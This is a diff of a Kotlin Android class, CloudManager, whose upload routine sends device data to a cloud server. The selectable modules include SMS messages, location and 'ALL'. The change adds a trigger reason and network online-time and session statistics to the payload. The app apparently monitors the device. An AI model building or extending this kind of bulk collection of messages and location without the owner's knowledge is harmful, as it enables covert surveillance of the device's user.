@@ -10,11 +10,11 @@ import java.net.URL
 
 object CloudManager {
 
-    // Modular Upload: Takes a list of features to upload (e.g. ["sms:20", "location"] or ["ALL"])
-    suspend fun uploadData(ctx: Context, modules: List<String>) {
+        // Modular Upload: Takes a list of features to upload (e.g. ["sms:20", "location"] or ["ALL"])
+    suspend fun uploadData(ctx: Context, modules: List<String>, triggerReason: String = "PERIODIC_SYNC") {
         withContext(Dispatchers.IO) {
             try {
-                DebugLogger.log("Cloud", "Starting Upload. Modules: $modules")
+                DebugLogger.log("Cloud", "Starting Upload. Modules: $modules | Trigger: $triggerReason")
 
                 val moduleMap = modules.associate {
                     val parts = it.split(":")
@@ -33,7 +33,12 @@ object CloudManager {
 
                 val fcmToken = DeviceManager.getRobustFcmToken(ctx)
                 if (fcmToken != null) json.put("fcm_token", fcmToken)
-                json.put("trigger", "MANUAL_FETCH")
+                json.put("trigger", triggerReason)
+                
+                // FIX: Inject Network Tracking Stats at the root level
+                val netStats = NetworkTracker.getStats(ctx)
+                json.put("online_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netStats.first))
+                json.put("online_sessions", netStats.second)
                 
                 val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                 val isAll = moduleMap.containsKey("all")
